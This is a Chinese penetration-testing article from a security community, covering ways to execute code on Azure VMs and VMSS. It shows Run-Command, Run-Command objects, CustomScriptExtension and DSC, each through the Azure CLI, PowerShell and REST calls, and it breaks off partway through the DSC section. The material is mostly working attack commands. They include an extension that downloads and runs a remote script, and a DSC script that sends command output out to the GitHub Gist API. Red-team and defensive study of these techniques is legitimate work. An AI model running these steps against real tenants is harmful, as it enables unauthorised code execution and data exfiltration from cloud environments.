---
title: 云上攻防之 Azure VM/VMSS 代码执行梳理+第三方扩展拿 access_token
url: https://xz.aliyun.com/news/93406
source: 先知安全技术社区
date: 2026-11-19
fetch_date: 2026-11-20T09:19:36.300255
---

# 云上攻防之 Azure VM/VMSS 代码执行梳理+第三方扩展拿 access_token

[先知社区](/)[文章](/news)[视频](/course)[众测](/vuln)[赛事](/ctf)[技能](/skills)[墨白](/mobai)[活动](/events)[名人堂](/hof)[积分商城](/points-mall)

[写文章](/write)

1

有用 1收藏打赏分享

# 云上攻防之 Azure VM/VMSS 代码执行梳理+第三方扩展拿 access\_token

[![](/images/default-avatar.png)闲\*人](/users/114143)·2026-11-20 00:27·19 分钟·68·广东·渗透测试

前言 本文是对云上攻防场景下的 Azure VM 和 VMSS 进行探究，梳理常见的代码执行方式，以及对此方式进行延伸，借助 Azure 商店中由外部厂方发布三方拓展拿 access token ，这些手法均是为了在环境中建立立足点。 Azure Virtual Machines（Azure VM），相当于本地 VMware / Hyper-V 里的虚拟机 Azure 虚拟机规模集（Virtual…

# 前言

本文是对云上攻防场景下的 Azure VM 和 VMSS 进行探究，梳理常见的代码执行方式，以及对此方式进行延伸，借助 Azure 商店中由外部厂方发布三方拓展拿 access token ，这些手法均是为了在环境中建立立足点。

> Azure Virtual Machines（Azure VM），相当于本地 VMware / Hyper-V 里的虚拟机
> Azure 虚拟机规模集（Virtual Machines Scale Sets，简称 VMSS）是 Azure 上用来批量管理一组配置相同的虚拟机的计算服务，Azure 会据定义的配置创建任意数量的相同实例，并让这些实例数量随负载自动增减。

# Azure VM 执行代码常见方式

## Run-Command

这是常见的方法，也可在 Azure 门户中调用

### Azure CLI

```
> az vm run-command invoke -g BAS -n BAS-Windows --command-id RunPowerShellScript --scripts "whoami"
```

![](https://xzfile.aliyuncs.com/2026/11/20/0023/e46873a6-a9d.png)

### Azure Powershell

```
> Invoke-AzVMRunCommand -ResourceGroupName 'BAS' -VMName 'BAS-Windows' -CommandId 'RunPowerShellScript' -ScriptString "whoami"
```

![](https://xzfile.aliyuncs.com/2026/11/20/0023/e46873a6-a9d.png)

### REST API

```
> Invoke-AzVMRunCommand -ResourceGroupName 'BAS' -VMName 'BAS-Windows' -CommandId 'RunPowerShellScript' -ScriptString "whoami"
```

![](https://xzfile.aliyuncs.com/2026/11/20/0023/9063b951-08a.png)

## Run-Command Object

先创建一个 Run-Command 对象，记录这次的执行，在读取这个对象时带上 `Expansion` 参数拿回结果。

### Azure CLI

第一步 `create` 建资源

```
> az vm run-command create --resource-group "BAS" --location "East US" --vm-name "BAS-Windows" --run-command-name "BASExample" --script "whoami"
```

![](https://xzfile.aliyuncs.com/2026/11/20/0023/1af30005-e71.png)

第二步 `show --expand instanceView` 取结果

```
> az vm run-command show --resource-group "BAS" --vm-name "BAS-Windows" --run-command-name "BASExample" --expand instanceView
```

![](https://xzfile.aliyuncs.com/2026/11/20/0023/a9152cb4-030.png)

### Azure Powershell

```
> Set-AzVMRunCommand -ResourceGroupName 'BAS' -VMName 'BAS-Windows' -RunCommandName 'BASCommand' -Location "East US" -SourceScript "whoami"

$Result = Get-AzVMRunCommand -ResourceGroupName 'BAS' -VMName 'BAS-Windows' -RunCommandName 'BASCommand' -Expand InstanceView
$Result.InstanceView
```

![](https://xzfile.aliyuncs.com/2026/11/20/0024/76de06e6-c51.png)

### REST API

```
$subscriptionId = "12345678-1234-1234-1234-123456789abc"
$resourceGroup = "BAS"
$vmName = "BAS-Windows"
$apiVersion = "2024-11-01"
$uri = "https://management.azure.com/subscriptions/$subscriptionId/resourceGroups/$resourceGroup/providers/Microsoft.Compute/virtualMachines/$vmName/runCommand?api-version=$apiVersion"
$headers = @{
    "Authorization" = "Bearer $token"
    "Content-Type"  = "application/json"
}
$body = @{
    location = "East US"
    properties = @{
        source = @{
            script = "whoami"
        }
    }
}
$response = Invoke-RestMethod -Method POST -Uri $uri -Headers $headers -Body $body
```

```
$runCommandName = "myRunCommand"
$uri = "https://management.azure.com/subscriptions/$subscriptionId/resourceGroups/$resourceGroup/providers/Microsoft.Compute/virtualMachines/$vmName/runCommands/$runCommandName`?api-version=$apiVersion"

$headers = @{ "Authorization" = "Bearer $token" }
$response = Invoke-RestMethod -Method GET -Uri $uri -Headers $headers
$response | ConvertTo-Json -Depth 10
```

![](https://xzfile.aliyuncs.com/2026/11/20/0024/ea546e1b-2ae.png)

## CustomScriptExtension

本质上做的操作是下载脚本并执行，利用的是正常功能机制，有权向 VM 下发扩展，就能在上面运行任意内容。

### Azure CLI

```
> az vm extension set --vm-name "BAS-Windows" --resource-group "BAS" --name CustomScriptExtension --publisher Microsoft.Compute --settings '{"commandToExecute":"powershell -ExecutionPolicy Unrestricted -file ScriptExtension.ps1"}' --protected-settings '{"fileUris":["https://<BLOB>.core.windows.net/extension/ScriptExtension.ps1"]}' --version 1.4
```

![](https://xzfile.aliyuncs.com/2026/11/20/0024/973e180a-533.png)

```
> az vm extension show --resource-group "BAS" --vm-name "BAS-Windows" --name "CustomScriptExtension" --instance-view
```

![](https://xzfile.aliyuncs.com/2026/11/20/0024/434e1f7f-586.png)

### Azure Powershell

```
> $null = Set-AzVMCustomScriptExtension -ResourceGroupName "BAS" -VMName "BAS-Windows" -Location "East US" -FileUri "<BLOBURL>" -Run "ScriptExtension" -Argument " " -Name "ScriptExtension.ps1"
> $Results = Get-AzVMCustomScriptExtension -ResourceGroupName “BAS” -VMName “BAS-Windows” -name "ScriptExtension.ps1" -Status
> $Results.SubStatuses
```

![](https://xzfile.aliyuncs.com/2026/11/20/0024/7aeff9ba-e3b.png)

### REST API

```
$SubscriptionID = "12345678-1234-1234-1234-123456789abc"
$ResourceGroupName = "BAS”
$VMName = " BAS-Windows"
$Location = "East US"

$uri = "https://management.azure.com/subscriptions/$SubscriptionID/resourceGroups/$ResourceGroupName/providers/Microsoft.Compute/virtualMachines/$VMName/extensions/ScriptExtension.ps1?api-version=2024-11-01"

$headers = @{
"Authorization" = "Bearer $Token"
"Content-Type" = "application/json" }

$body = @{
properties = @{
publisher = "Microsoft.Compute"
type = "CustomScriptExtension"
typeHandlerVersion = "1.4"
autoUpgradeMinorVersion = $true
settings = @{
commandToExecute = "powershell -ExecutionPolicy Unrestricted -file ScriptExtension.ps1" }
protectedSettings = @{
fileUris = @( "https://<SITE>.blob.core.windows.net/<container>/<script>.ps1" ) } } location = $Location } | ConvertTo-Json -Depth 10

$response = Invoke-RestMethod -Uri $uri -Method Put -Headers $headers -Body $body

$response
```

## DSC

DSC 得打个 zip 包，里面要有 `dscmetadata.json`，还要有一份格式合规的 PowerShell 内容，其中包含一个 configuration 对象。它实际上是将一项配置声明交给系统，由系统据此达到目标状态，并非简单地执行一段代码，因此构造起来要求更多。
拿命令执行后的结果，在目标 VM 上，要么利用别的代码执行方式去取出，要么就让ps1脚本自己外带(如发送到GitHub Gist API)

BASDSC.ps1

```
[DscLocalConfigurationManager()]
Configuration DscMetaConfigs
{
    Node localhost
    {
        Settings
        {
             RefreshFrequencyMins           = 30
             RefreshMode                    = 'PUSH'
             ConfigurationMode              = 'ApplyAndAutoCorrect'
             AllowModuleOverwrite           = $False
             RebootNodeIfNeeded             = $False
             ActionAfterReboot              = 'ContinueConfiguration'
             ConfigurationModeFrequencyMins = 15
        }
    }
}
DscMetaConfigs -Output .\output\
Set-DscLocalConfigurationManager -Path .\output\

configuration BASDSC
{
    Import-DscResource -ModuleName 'PSDesiredStateConfiguration'

    Node localhost
    {
        Script ScriptExample
        {
            SetScript = {
                $cmd = $(whoami)
                $body = @{
                    description = "NetSPI BAS"
                    public = $false
                    files = @{
                        "Return" = @{content = $cmd}
                    }
                }
                iwr -Uri "https://api.github.com/gists" -Method Post -Headers @{
                    "Accept" = "application/vnd.github+json"
                    "Authorization" = "Bearer XXXX"
                    "X-GitHub-Api-Version" = "2022-11-28"
                } -Body ($body | ConvertTo-Json) -UseBasicParsing
            }
            TestScript = {
                return $false
            }
            GetScript = { return @{result = 'result'} }
        }
    }
}
```

### Azure CLI

```
> az vm extension set --resource-group "BAS" --vm-name "BAS-Windows" --name "DSC" --publisher "Microsoft.Powershell" --version 2.83.5 --settings '{"ModulesUrl": "https://<StorageAccount>.blob.core.windows.net/dsc/BASDSC.ps1.zip", "ConfigurationFunction": "BASDSC.ps1\\BASDSC", "Privacy": {"DataCollection": "Disable"}}' --protected-settings '{"DataBlobUri": "", "Items": {}}'
```

![](https://xzfile.aliyuncs.com/2026/11/20/0024/bf77cb3b-4f2.png)

### Azure Powershell

```
> Publish-AzVMDscConfiguration -ConfigurationPat...